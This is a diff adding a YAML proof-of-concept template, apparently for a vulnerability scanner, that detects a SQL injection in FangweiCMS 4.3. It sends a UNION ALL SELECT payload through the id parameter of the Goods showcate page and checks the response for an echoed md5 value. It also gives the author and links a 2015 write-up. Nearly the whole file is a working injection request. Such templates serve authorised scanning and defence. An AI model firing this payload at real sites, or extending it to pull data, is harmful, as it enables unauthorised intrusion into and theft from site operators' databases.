@@ -1,0 +1,13 @@
+name: poc-yaml-fangweicms-sqli
+set:
+  rand: randomInt(200000000, 210000000)
+rules:
+  - method: GET
+    path: /index.php?m=Goods&a=showcate&id=103%20UNION%20ALL%20SELECT%20CONCAT%28md5({{rand}})%29%23
+    expression: |
+      response.body.bcontains(bytes(md5(string(rand))))
+detail:
+  author: Rexus
+  Affected Version: "4.3"
+  links:
+    - http://www.wujunjie.net/index.php/2015/08/02/%E6%96%B9%E7%BB%B4%E5%9B%A2%E8%B4%AD4-3%E6%9C%80%E6%96%B0%E7%89%88sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/
